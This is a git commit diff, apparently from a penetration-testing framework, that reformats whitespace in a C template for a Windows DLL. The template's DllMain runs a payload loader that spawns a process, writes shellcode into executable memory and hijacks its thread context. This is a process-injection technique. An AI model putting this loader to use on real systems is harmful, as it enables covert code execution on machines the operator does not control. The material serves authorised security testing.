c6304704f4c7e5c75678962e1869931e79d6ccbd
Spencer McIntyre <zeroSteiner@gmail.com>
2020-11-16 11:26:15 -0500

    Cleanup inconsistent whitespace in the DLL template

--- data/templates/src/pe/dll/template.c
+++ data/templates/src/pe/dll/template.c
@@ -5,11 +5,10 @@
 /* hand-rolled bzero allows us to avoid including ms vc runtime */
 void inline_bzero(void *p, size_t l)
 {
-   
-           BYTE *q = (BYTE *)p;
-           size_t x = 0;
-           for (x = 0; x < l; x++)
-                     *(q++) = 0x00;
+	BYTE *q = (BYTE *)p;
+	size_t x = 0;
+	for (x = 0; x < l; x++)
+		*(q++) = 0x00;
 }
 
 #endif
@@ -20,34 +19,34 @@ void ExecutePayload(void);
 BOOL WINAPI
 DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
 {
-    switch (dwReason)
-    {
-        case DLL_PROCESS_ATTACH:
+	switch (dwReason)
+	{
+		case DLL_PROCESS_ATTACH:
 			ExecutePayload();
-            break;
+			break;
 
-        case DLL_PROCESS_DETACH:
-            // Code to run when the DLL is freed
-            break;
+		case DLL_PROCESS_DETACH:
+			// Code to run when the DLL is freed
+			break;
 
-        case DLL_THREAD_ATTACH:
-            // Code to run when a thread is created during the DLL's lifetime
-            break;
+		case DLL_THREAD_ATTACH:
+			// Code to run when a thread is created during the DLL's lifetime
+			break;
 
-        case DLL_THREAD_DETACH:
-            // Code to run when a thread ends normally.
-            break;
-    }
-    return TRUE;
+		case DLL_THREAD_DETACH:
+			// Code to run when a thread ends normally.
+			break;
+	}
+	return TRUE;
 }
 
 void ExecutePayload(void) {
-    int error;
+	int error;
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
 	CONTEXT ctx;
 	DWORD prot;
-   LPVOID ep;
+	LPVOID ep;
 
 	// Start up the payload in a new process
 	inline_bzero( &si, sizeof( si ));
@@ -58,44 +57,22 @@ void ExecutePayload(void) {
 		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
 		GetThreadContext(pi.hThread, &ctx);
 
-	   ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-        WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);
+		WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);
 
 #ifdef _WIN64
-	   ctx.Rip = (DWORD64)ep;
+		ctx.Rip = (DWORD64)ep;
 #else
-	   ctx.Eip = (DWORD)ep;
+		ctx.Eip = (DWORD)ep;
 #endif
 
-        SetThreadContext(pi.hThread,&ctx);
+		SetThreadContext(pi.hThread,&ctx);
 
-        ResumeThread(pi.hThread);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+		ResumeThread(pi.hThread);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
 	}
-   // ExitProcess(0);
-   ExitThread(0);
+	// ExitProcess(0);
+	ExitThread(0);
 }
-
-/*
-typedef VOID
-(NTAPI *PIMAGE_TLS_CALLBACK) (
-    PVOID DllHandle,
-    ULONG Reason,
-    PVOID Reserved
-    );
-
-VOID NTAPI TlsCallback(
-      IN PVOID DllHandle,
-      IN ULONG Reason,
-      IN PVOID Reserved)
-{
-	__asm  ( "int3" );
-}
-
-ULONG _tls_index;
-PIMAGE_TLS_CALLBACK _tls_cb[] = { TlsCallback, NULL };
-IMAGE_TLS_DIRECTORY _tls_used = { 0, 0, (ULONG)&_tls_index, (ULONG)_tls_cb, 1000, 0 };
-*/
-
